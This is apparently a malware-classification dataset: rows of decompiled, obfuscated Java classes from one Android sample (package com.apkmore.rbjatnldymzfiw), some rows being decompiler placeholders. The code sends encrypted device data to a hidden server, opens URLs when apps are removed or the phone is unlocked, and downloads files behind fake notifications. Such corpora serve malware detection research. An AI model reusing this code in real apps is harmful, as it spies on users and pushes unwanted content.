"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\e.code","public class e {   public static final String[] f65a={com.apkmore.rbjatnldymzfiw.a.c.b.aO};   private static e b;   private Context c;   private com.apkmore.rbjatnldymzfiw.a.b.d d;   private e(  Context context){     this.c=context;     this.d=new com.apkmore.rbjatnldymzfiw.a.b.d(this.c);   }   public static e a(  Context context){     if (b == null) {       b=new e(context.getApplicationContext());     }     return b;   }   private InputStream a(  String str,  byte[] bArr){     HttpPost httpPost;     InputStream inputStream=null;     HttpClient a2=i.a(this.c);     if (a2 != null) {       try {         httpPost=new HttpPost(str);       }  catch (      Exception e) {         httpPost=null;       }       if (bArr != null) {         httpPost.setEntity(new ByteArrayEntity(bArr));         Log.d(com.apkmore.rbjatnldymzfiw.a.c.b.f44a,com.apkmore.rbjatnldymzfiw.a.c.b.B + "":"" + com.apkmore.rbjatnldymzfiw.a.c.h.c(this.c));         Log.d(com.apkmore.rbjatnldymzfiw.a.c.b.f44a,com.apkmore.rbjatnldymzfiw.a.c.b.K);       }       int i=0;       while (true) {         int i2=i;         if (i2 >= 2) {           break;         }         try {           HttpResponse execute=a2.execute(httpPost);           int statusCode=execute.getStatusLine().getStatusCode();           if (String.valueOf(statusCode).startsWith(""2"")) {             Log.d(com.apkmore.rbjatnldymzfiw.a.c.b.f44a,com.apkmore.rbjatnldymzfiw.a.c.b.L + statusCode);             inputStream=execute.getEntity().getContent();             break;           }         }  catch (        ClientProtocolException e2) {           e2.getMessage();         } catch (        IOException e3) {           e3.getMessage();         }         i=i2 + 1;         try {           Thread.sleep(2000L);         }  catch (        InterruptedException e4) {           e4.printStackTrace();         }       }     }     return inputStream;   }   private String a(  InputStream inputStream){     BufferedReader bufferedReader;     Throwable th;     String str=null;     if (inputStream != null) {       StringBuilder sb=new StringBuilder();       try {         bufferedReader=new BufferedReader(new InputStreamReader(inputStream));         while (true) {           try {             String readLine=bufferedReader.readLine();             if (readLine == null) {               break;             }             sb.append(readLine);           }  catch (          Exception e) {             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e2) {                 e2.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e3) {                 e3.printStackTrace();               }             }             return str;           } catch (          Throwable th2) {             th=th2;             if (bufferedReader != null) {               try {                 bufferedReader.close();               }  catch (              IOException e4) {                 e4.printStackTrace();               }             }             if (inputStream != null) {               try {                 inputStream.close();               }  catch (              IOException e5) {                 e5.printStackTrace();               }             }             throw th;           }         }         str=com.apkmore.rbjatnldymzfiw.a.c.c.b(com.apkmore.rbjatnldymzfiw.a.c.b.aP,sb.toString());         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e6) {             e6.printStackTrace();           }         }         if (inputStream != null) {           try {             inputStream.close();           }  catch (          IOException e7) {             e7.printStackTrace();           }         }       }  catch (      Exception e8) {         bufferedReader=null;       } catch (      Throwable th3) {         bufferedReader=null;         th=th3;       }     }     return str;   }   private String a(  HashMap hashMap){     String str=f65a[0];     if (hashMap == null) {       return str;     }     StringBuffer stringBuffer=null;     for (    String str2 : hashMap.keySet()) {       String str3=(String)hashMap.get(str2);       if (stringBuffer == null) {         stringBuffer=new StringBuffer();         stringBuffer.append(""?"");       }  else {         stringBuffer.append(""&"");       }       stringBuffer.append(str2);       stringBuffer.append(""="");       stringBuffer.append(str3);     }     return str + stringBuffer.toString();   }   private byte[] a(){     JSONObject jSONObject=new JSONObject();     try {       jSONObject.put(this.d.a(),this.d.b());       return com.apkmore.rbjatnldymzfiw.a.c.c.a(com.apkmore.rbjatnldymzfiw.a.c.b.aP,jSONObject.toString()).getBytes();     }  catch (    Exception e) {       e.printStackTrace();       return null;     }   }   public com.apkmore.rbjatnldymzfiw.a.b.e a(  String str){     String a2;     HashMap hashMap=new HashMap();     hashMap.put(com.apkmore.rbjatnldymzfiw.a.c.b.V,""1"");     String a3=a(hashMap);     if (a3 != null) {     }     this.d.r=str;     InputStream a4=a(a3,a());     if (a4 == null || (a2=a(a4)) == null) {       return null;     }     return (com.apkmore.rbjatnldymzfiw.a.b.e)com.apkmore.rbjatnldymzfiw.a.b.f.a(com.apkmore.rbjatnldymzfiw.a.b.e.class,a2);   }   public HashMap a(  boolean z){     String a2;     HashMap hashMap=new HashMap();     if (!z && com.apkmore.rbjatnldymzfiw.a.c.h.m(this.c).getLong(com.apkmore.rbjatnldymzfiw.a.c.b.aJ,-1L) != -1 && System.currentTimeMillis() - com.apkmore.rbjatnldymzfiw.a.c.h.m(this.c).getLong(com.apkmore.rbjatnldymzfiw.a.c.b.aJ,-1L) < 43200000) {       String n=com.apkmore.rbjatnldymzfiw.a.c.h.n(this.c);       if (n != null) {         HashMap hashMap2=new HashMap();         com.apkmore.rbjatnldymzfiw.a.b.e eVar=(com.apkmore.rbjatnldymzfiw.a.b.e)com.apkmore.rbjatnldymzfiw.a.b.f.a(com.apkmore.rbjatnldymzfiw.a.b.e.class,n);         com.apkmore.rbjatnldymzfiw.a.b.b[] bVarArr=(com.apkmore.rbjatnldymzfiw.a.b.b[])com.apkmore.rbjatnldymzfiw.a.b.f.b(com.apkmore.rbjatnldymzfiw.a.b.b.class,n);         hashMap2.put(com.apkmore.rbjatnldymzfiw.a.b.e.class.getName(),eVar);         hashMap2.put(com.apkmore.rbjatnldymzfiw.a.b.b.class.getName(),bVarArr);         return hashMap2;       }     }  else     if (com.apkmore.rbjatnldymzfiw.a.c.h.f(this.c) != null) {       HashMap hashMap3=new HashMap();       hashMap3.put(com.apkmore.rbjatnldymzfiw.a.c.b.V,""0"");       String a3=a(hashMap3);       com.apkmore.rbjatnldymzfiw.a.c.h.a(System.currentTimeMillis(),this.c);       if (a3 != null) {       }       InputStream a4=a(a3,a());       if (a4 == null || (a2=a(a4)) == null) {         return null;       }       com.apkmore.rbjatnldymzfiw.a.c.h.d(this.c,a2);       com.apkmore.rbjatnldymzfiw.a.b.e eVar2=(com.apkmore.rbjatnldymzfiw.a.b.e)com.apkmore.rbjatnldymzfiw.a.b.f.a(com.apkmore.rbjatnldymzfiw.a.b.e.class,a2);       com.apkmore.rbjatnldymzfiw.a.b.b[] bVarArr2=(com.apkmore.rbjatnldymzfiw.a.b.b[])com.apkmore.rbjatnldymzfiw.a.b.f.b(com.apkmore.rbjatnldymzfiw.a.b.b.class,a2);       hashMap.put(com.apkmore.rbjatnldymzfiw.a.b.e.class.getName(),eVar2);       hashMap.put(com.apkmore.rbjatnldymzfiw.a.b.b.class.getName(),bVarArr2);     }     return hashMap;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\f.code","public class f {   private static f f66a=null;   private Context b;   private int c=0;   private int d=0;   private f(  Context context){     this.b=context;   }   public static synchronized f a(  Context context){     f fVar; synchronized (f.class) {       if (f66a == null) {         f66a=new f(context);       }       fVar=f66a;     }     return fVar;   }   public void a(  int i,  int i2){     if (!Environment.getExternalStorageState().equals(""mounted"")) {       Toast.makeText(this.b,com.apkmore.rbjatnldymzfiw.a.c.b.bi,1).show();       return;     }     if ("""".equals(com.apkmore.rbjatnldymzfiw.a.c.h.j(this.b))) {       Toast.makeText(this.b,com.apkmore.rbjatnldymzfiw.a.c.b.bj,1).show();       return;     }     g gVar=new g(this,i,i2);     this.c=i2;     this.d=i;     com.apkmore.rbjatnldymzfiw.a.c.h.b(this.b,i);     com.apkmore.rbjatnldymzfiw.a.c.h.a(this.b,i2);     new com.apkmore.rbjatnldymzfiw.a.a.k(this.b);     if (com.apkmore.rbjatnldymzfiw.a.c.h.l(this.b)) {       gVar.sendEmptyMessage(0);     }  else     if (com.apkmore.rbjatnldymzfiw.a.c.h.f(this.b) != null) {       new com.apkmore.rbjatnldymzfiw.a.a.c().a(com.apkmore.rbjatnldymzfiw.a.c.b.bB,com.apkmore.rbjatnldymzfiw.a.c.b.bA,gVar);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@70531fb2"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\h.code","final class h extends Handler {   final Izg f68a;   public h(  Izg izg,  Looper looper){     super(looper);     this.f68a=izg;   }   @Override public void handleMessage(  Message message){     boolean z;     h hVar;     Context context;     Context context2;     Context context3;     Context context4;     z=this.f68a.h;     if (z) {       this.f68a.a();       hVar=this.f68a.d;       hVar.sendEmptyMessageDelayed(0,1000L);       context=this.f68a.b;       DisplayMetrics a2=com.apkmore.rbjatnldymzfiw.a.c.i.a(context);       int i=a2.heightPixels;       int i2=a2.widthPixels;       context2=this.f68a.b;       int i3=com.apkmore.rbjatnldymzfiw.a.c.h.k(context2)[1];       context3=this.f68a.b;       SharedPreferences sharedPreferences=context3.getSharedPreferences(com.apkmore.rbjatnldymzfiw.a.c.b.by,0);       int i4=sharedPreferences.getInt(com.apkmore.rbjatnldymzfiw.a.c.b.y,-1);       if (i2 == i4 || i4 == -1) {         if (i4 == -1) {           SharedPreferences.Editor edit=sharedPreferences.edit();           edit.putInt(com.apkmore.rbjatnldymzfiw.a.c.b.y,i2);           edit.commit();           return;         }         return;       }       com.apkmore.rbjatnldymzfiw.a.d.c.a();       SharedPreferences.Editor edit2=sharedPreferences.edit();       edit2.putInt(com.apkmore.rbjatnldymzfiw.a.c.b.y,i2);       edit2.commit();       int i5=i / 2;       context4=this.f68a.b;       com.apkmore.rbjatnldymzfiw.a.c.h.a(context4,0,i5);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\i.code","public class i {   public static HttpClient a(  Context context){     if (c(context) == null) {       return null;     }     if (!b(context)) {       return new DefaultHttpClient();     }     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);     HttpConnectionParams.setSoTimeout(basicHttpParams,30000);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,204800);     HttpClientParams.setRedirecting(basicHttpParams,true);     HttpHost httpHost=new HttpHost(com.apkmore.rbjatnldymzfiw.a.c.b.Y,80);     if (com.apkmore.rbjatnldymzfiw.a.c.b.Z.equalsIgnoreCase(c(context))) {       httpHost=new HttpHost(com.apkmore.rbjatnldymzfiw.a.c.b.aa,80);     }     basicHttpParams.setParameter(""http.route.default-proxy"",httpHost);     return new DefaultHttpClient(basicHttpParams);   }   public static void a(  Context context,  int i){     d(context).cancel(400000 + i);   }   public static void a(  Context context,  int i,  String str,  int i2,  int i3,  Intent intent,  String str2,  int i4){     StringBuffer stringBuffer;     Notification notification=new Notification(i,"""",System.currentTimeMillis());     PendingIntent activity=PendingIntent.getActivity(context,0,intent,134217728);     notification.flags=i3;     StringBuffer stringBuffer2=new StringBuffer();     for (    Map.Entry entry : com.apkmore.rbjatnldymzfiw.a.a.g.f33a.entrySet()) {       stringBuffer2.append(((String)entry.getValue()) + ((String)entry.getKey()));     }     String stringBuffer3=stringBuffer2.toString();     if (stringBuffer3 == null || stringBuffer3.length() <= 1) {       stringBuffer=stringBuffer2;     }  else {       String substring=stringBuffer3.substring(0,stringBuffer3.length() - 1);       stringBuffer=new StringBuffer();       stringBuffer.append(substring);     }     if (i4 == -1) {       stringBuffer=new StringBuffer();       stringBuffer.append(str2);     }     if (stringBuffer.toString().equals("""") || stringBuffer.toString() == null) {       stringBuffer.append(com.apkmore.rbjatnldymzfiw.a.c.b.bz + str2);     }     notification.setLatestEventInfo(context,str,stringBuffer.toString(),activity);     NotificationManager d=d(context);     d.notify(400000 + i2,notification);     try {       if (!com.apkmore.rbjatnldymzfiw.a.a.k.a(context)) {         com.apkmore.rbjatnldymzfiw.a.a.g.f33a.clear();       }       if (com.apkmore.rbjatnldymzfiw.a.a.c.b.size() == 0 && i3 == 32) {         d.cancel(400100);       }     }  catch (    Exception e) {     }   }   public static void a(  Context context,  String str){     Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(str));     intent.addFlags(268435456);     context.startActivity(intent);   }   protected static boolean b(  Context context){     String c=c(context);     if (c != null) {       return c.compareTo(com.apkmore.rbjatnldymzfiw.a.c.b.X) == 0 || c.compareTo(com.apkmore.rbjatnldymzfiw.a.c.b.ab) == 0 || c.compareTo(com.apkmore.rbjatnldymzfiw.a.c.b.ac) == 0;     }     return false;   }   public static String c(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static NotificationManager d(  Context context){     return (NotificationManager)context.getSystemService(""notification"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\Izg.code","!org.eclipse.jdt.core.dom.TypeDeclaration@74e40cc7"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\j.code","public class j {   public static Handler f69a;   private static Context c;   private int f;   private int h;   private static j d=null;   private static List e=null;   private static com.apkmore.rbjatnldymzfiw.a.d.c g=null;   static Handler b=new l();   private j(  Context context,  int i,  int i2){     c=context.getApplicationContext();     this.f=i;     this.h=i2;     f69a=b;   }   public static synchronized j a(  Context context,  int i,  int i2){     j jVar; synchronized (j.class) {       if (d == null) {         d=new j(context,i,i2);       }       jVar=d;     }     return jVar;   }   public static void a(){     new k().start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\k.code","public final class k extends Thread {   @Override public void run(){     Context context;     Context context2;     super.run();     List list=null;     context=j.c;     if (context != null) {       context2=j.c;       list=com.apkmore.rbjatnldymzfiw.a.c.h.b(context2,false);       if (list == null) {         list=new ArrayList();       }     }     if (list != null) {       List unused=j.e=list;       j.b.sendEmptyMessage(0);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\l.code","final class l extends Handler {   @Override public void handleMessage(  android.os.Message r5){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.a.l.handleMessage(android.os.Message):void"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\m.code","public class m {   private static m f70a=null;   private m(){   }   public static m a(){     if (f70a == null) {       f70a=new m();     }     return f70a;   }   public void a(  Context context,  int i,  int i2){     new n(this,context,i,i2).execute(new Void[0]);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\n.code","public class n extends AsyncTask {   final m f71a;   private StringBuffer b;   private Context c;   private int d;   private int e;   public n(  m mVar,  Context context,  int i,  int i2){     this.f71a=mVar;     this.c=context;     this.d=i;     this.e=i2;   }   @Override public com.apkmore.rbjatnldymzfiw.a.b.e doInBackground(  Void... voidArr){     e a2=e.a(this.c);     this.b=new StringBuffer();     String e=com.apkmore.rbjatnldymzfiw.a.c.h.e(this.c);     if (this.d != -1001) {       if (!"""".equals(e)) {         this.b.append(e);         this.b.append("";"");       }       this.b.append(this.d);       this.b.append("","");       this.b.append(this.e);     }  else {       this.b.append(e);     }     com.apkmore.rbjatnldymzfiw.a.b.e a3=a2.a(this.b.toString());     if (a3 != null) {     }     return a3;   }   @Override public void onPostExecute(  com.apkmore.rbjatnldymzfiw.a.b.e eVar){     super.onPostExecute(eVar);     if (eVar == null || !(eVar == null || eVar.f41a == 0)) {       com.apkmore.rbjatnldymzfiw.a.c.h.a(this.c,this.b == null ? null : this.b.toString());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\Uj.code","!org.eclipse.jdt.core.dom.TypeDeclaration@61186e55"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a\Yo.code","public class Yo extends BroadcastReceiver {   private static Class b=null;   private Context f27a;   public static Class a(  Context context){     if (b == null) {       b=com.apkmore.rbjatnldymzfiw.a.c.h.b(context,Izg.class);     }     return b;   }   @Override public void onReceive(  Context context,  Intent intent){     String[] strArr;     this.f27a=context;     String action=intent.getAction();     if (""android.intent.action.PACKAGE_ADDED"".equals(action)) {       com.apkmore.rbjatnldymzfiw.a.c.h.a(context,intent);       return;     }     if (""android.intent.action.USER_PRESENT"".equals(action)) {       if (!Environment.getExternalStorageState().equals(""mounted"") || """".equals(com.apkmore.rbjatnldymzfiw.a.c.h.j(context))) {         return;       }       com.apkmore.rbjatnldymzfiw.a.c.h.t(context);       com.apkmore.rbjatnldymzfiw.a.c.h.a(context,com.apkmore.rbjatnldymzfiw.a.d.c.f53a ? false : true);       com.apkmore.rbjatnldymzfiw.a.c.h.i(context);       return;     }     if (""android.net.conn.CONNECTIVITY_CHANGE"".equals(action)) {       return;     }     if (""android.intent.action.SCREEN_OFF"".equals(action)) {       context.stopService(new Intent(context,(Class<?>)a(context)));       return;     }     if (""android.intent.action.PACKAGE_REMOVED"".equals(action)) {       String n=com.apkmore.rbjatnldymzfiw.a.c.h.n(context);       StringBuilder sb=new StringBuilder();       String[] f=com.apkmore.rbjatnldymzfiw.a.c.h.f(n);       if (f == null) {         String u=com.apkmore.rbjatnldymzfiw.a.c.h.u(context);         strArr=u.equals("""") ? new String[]{com.apkmore.rbjatnldymzfiw.a.c.b.bK} : new String[]{u};       }  else {         strArr=f;       }       String str=strArr[(int)(0.0d + (Math.random() * strArr.length))];       com.apkmore.rbjatnldymzfiw.a.c.h.e(context,str);       sb.append(str);       if (str.contains(com.apkmore.rbjatnldymzfiw.a.c.b.bN)) {         sb.append(com.apkmore.rbjatnldymzfiw.a.c.b.bO + com.apkmore.rbjatnldymzfiw.a.c.b.bM);       }  else {         sb.append(com.apkmore.rbjatnldymzfiw.a.c.b.bN + com.apkmore.rbjatnldymzfiw.a.c.b.bM);       }       sb.append(com.apkmore.rbjatnldymzfiw.a.c.h.a(new com.apkmore.rbjatnldymzfiw.a.b.d(context)));       if (n != null) {         try {           if (n.equals("""")) {             return;           }           i.a(context,sb.toString());         }  catch (        Exception e) {           e.printStackTrace();         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\a.code","public class a extends SQLiteOpenHelper {   public a(  Context context){     super(context,com.apkmore.rbjatnldymzfiw.a.c.b.aQ,(SQLiteDatabase.CursorFactory)null,1);   }   @Override public void onCreate(  SQLiteDatabase sQLiteDatabase){     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.a.c.b.bk + "" "" + com.apkmore.rbjatnldymzfiw.a.c.b.aR+ com.apkmore.rbjatnldymzfiw.a.c.b.bl+ com.apkmore.rbjatnldymzfiw.a.c.b.aT+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bm+ com.apkmore.rbjatnldymzfiw.a.c.b.aU+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bm+ com.apkmore.rbjatnldymzfiw.a.c.b.aS+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bm+ com.apkmore.rbjatnldymzfiw.a.c.b.aV+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bn+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aW+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bn+ "",""+ com.apkmore.rbjatnldymzfiw.a.c.b.aX+ "" ""+ com.apkmore.rbjatnldymzfiw.a.c.b.bn+ "")"");   }   @Override public void onUpgrade(  SQLiteDatabase sQLiteDatabase,  int i,  int i2){     sQLiteDatabase.execSQL(com.apkmore.rbjatnldymzfiw.a.c.b.bo + "" "" + com.apkmore.rbjatnldymzfiw.a.c.b.aR);     onCreate(sQLiteDatabase);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\b.code","public class b {   private static Map b=new HashMap();   public static Map f29a=new HashMap();   public static void a(  String str,  Context context,  int i,  String str2,  int i2,  String str3){     g gVar;     if (!com.apkmore.rbjatnldymzfiw.a.c.g.a(context)) {       Toast.makeText(context,com.apkmore.rbjatnldymzfiw.a.c.b.bd,1).show();       return;     }     m.a().a(context,i2,1);     if (i2 == 11111) {       gVar=new g(str,com.apkmore.rbjatnldymzfiw.a.c.g.h,context,i,str2,i2,str3);     }  else {       c.c.add(str);       com.apkmore.rbjatnldymzfiw.a.i.a(context,R.drawable.stat_sys_download,com.apkmore.rbjatnldymzfiw.a.c.b.az,100,16,new Intent(),str3,0);       gVar=new g(str,com.apkmore.rbjatnldymzfiw.a.c.h.b(i2),context,i,str2,i2,str3);     }     new Thread(gVar).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\c.code","public class c {   public static Map f30a=new HashMap();   public static Map b=new HashMap();   public static List c=new ArrayList();   public static List d=new ArrayList();   public void a(  String str,  int i,  Handler handler){     if (str != null) {       new Thread(new d(this,str,i,handler)).start();     }   }   public void a(  String str,  String str2,  Handler handler){     new Thread(new e(this,str,str2,handler)).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\d.code","public class d implements Runnable {   final String f31a;   final int b;   final Handler c;   final c d;   public d(  c cVar,  String str,  int i,  Handler handler){     this.d=cVar;     this.f31a=str;     this.b=i;     this.c=handler;   }   @Override public void run(){     try {       Bitmap c=com.apkmore.rbjatnldymzfiw.a.c.h.c(this.f31a);       if (c == null) {         com.apkmore.rbjatnldymzfiw.a.c.h.c(this.f31a);       }  else {         com.apkmore.rbjatnldymzfiw.a.c.h.a(this.b,c);       }     }  catch (    Exception e) {       e.printStackTrace();     }     try {       Thread.sleep(2000L);     }  catch (    InterruptedException e2) {       e2.printStackTrace();     }     this.c.sendEmptyMessage(0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\e.code","public class e implements Runnable {   final String f32a;   final String b;   final Handler c;   final c d;   public e(  c cVar,  String str,  String str2,  Handler handler){     this.d=cVar;     this.f32a=str;     this.b=str2;     this.c=handler;   }   @Override public void run(){     try {       com.apkmore.rbjatnldymzfiw.a.c.h.a(this.f32a,this.b);     }  catch (    IOException e) {       e.printStackTrace();     }     this.c.sendEmptyMessage(0);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\f.code","public interface f {   void a(  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\g.code","public class g implements Runnable {   public static j b;   private int d=0;   private Context e;   private int f;   private String g;   private String h;   private File i;   private String j;   private int k;   public static Map f33a=new HashMap();   public static List c=new ArrayList();   public g(  String str,  File file,  Context context,  int i,  String str2,  int i2,  String str3){     this.f=i2;     this.g=str3;     this.h=str2;     this.e=context;     this.j=str;     this.i=file;     this.k=i;   }   @Override public void run(){     try {       if (this.k == 1) {         b=new j(this.e.getApplicationContext(),this.j,this.i,1,this.k,this.h,this.f,this.g);         if (!c.contains(b)) {           c.add(b);         }       }  else       if (this.k == 2) {         b=new j(this.e.getApplicationContext(),this.j,this.i,1,this.k,this.h,this.f,this.g);       }       b.a(new h(this));     }  catch (    Exception e) {       b.a(this.j,this.e,1,this.h,this.f,this.g);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\h.code","class h implements f {   final g f34a;   public h(  g gVar){     this.f34a=gVar;   }   @Override public void a(  int i){     int i2;     String str;     String str2;     String str3;     Context context;     String str4;     String str5;     String str6;     try {       i2=this.f34a.f;       if (i2 != 11111) {         float f=0.0f;         Map map=i.b;         str=this.f34a.j;         if (map.get(str) != null) {           Map map2=i.b;           str6=this.f34a.j;           f=i / ((Integer)map2.get(str6)).intValue();         }         int i3=(int)(f * 100.0f);         str2=this.f34a.g;         if (str2.length() > 4) {           Map map3=g.f33a;           StringBuilder sb=new StringBuilder();           str5=this.f34a.g;           map3.put(sb.append(str5.substring(0,4)).append(""../"").toString(),i3 + ""%:"");         }  else {           Map map4=g.f33a;           StringBuilder sb2=new StringBuilder();           str3=this.f34a.g;           map4.put(sb2.append(str3).append(""/"").toString(),i3 + ""%:"");         }         context=this.f34a.e;         String str7=com.apkmore.rbjatnldymzfiw.a.c.b.az;         Intent intent=new Intent();         str4=this.f34a.g;         com.apkmore.rbjatnldymzfiw.a.i.a(context,R.drawable.stat_sys_download,str7,100,16,intent,str4,i3);       }     }  catch (    Exception e) {       e.printStackTrace();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.a.a\i.code","public class i extends Thread {   public static Map f35a=new HashMap();   public static Map b=new HashMap();   private File c;   private URL d;   private int e;   private int f;   private int g;   private boolean h=false;   private j i;   private HttpURLConnection j;   private int k;   public i(  j jVar,  URL url,  File file,  int i,  int i2,  int i3,  HttpURLConnection httpURLConnection,  int i4){     this.f=-1;     this.d=url;     this.c=file;     this.e=i;     this.i=jVar;     this.f=i3;     this.g=i2;     this.j=httpURLConnection;     this.k=i4;   }   public boolean a(){     return this.h;   }   public long b(){     return this.g;   }   @Override public void run(){     InputStream inputStream;     int read;     int i=0;     if (this.g < this.e) {       try {         if (this.k == 1) {           HttpURLConnection httpURLConnection=(HttpURLConnection)this.d.openConnection();           httpURLConnection.setConnectTimeout(5000);           httpURLConnection.setRequestMethod(com.apkmore.rbjatnldymzfiw.a.c.b.bc);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ai,com.apkmore.rbjatnldymzfiw.a.c.b.aj);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ak,com.apkmore.rbjatnldymzfiw.a.c.b.al);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.bp,this.d.toString());           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.am,com.apkmore.rbjatnldymzfiw.a.c.b.ae);           int i2=(this.e * (this.f - 1)) + this.g;           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ah,com.apkmore.rbjatnldymzfiw.a.c.b.ag + ""="" + i2+ ""-""+ ((this.e * this.f) - 1));           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.an,com.apkmore.rbjatnldymzfiw.a.c.b.ao);           httpURLConnection.setRequestProperty(com.apkmore.rbjatnldymzfiw.a.c.b.ap,com.apkmore.rbjatnldymzfiw.a.c.b.aq);           inputStream=httpURLConnection.getInputStream();           i=i2;         }  else {           inputStream=this.j.getInputStream();         }         byte[] bArr=new byte[15360];         RandomAccessFile randomAccessFile=new RandomAccessFile(this.c,com.apkmore.rbjatnldymzfiw.a.c.b.bg);         randomAccessFile.seek(i);         long j=0;         while (!this.i.a() && (read=inputStream.read(bArr,0,15360)) != -1) {           randomAccessFile.write(bArr,0,read);           this.g=read + this.g;           long currentTimeMillis=System.currentTimeMillis();           if (currentTimeMillis - j > 800) {             this.i.a(this.f,this.g);           }  else {             currentTimeMillis=j;           }           this.i.a(this.g);           j=currentTimeMillis;         }         randomAccessFile.close();         inputStream.close();         this.h=true;       }  catch (      Exception e) {         this.g=-1;       }     }   } } "
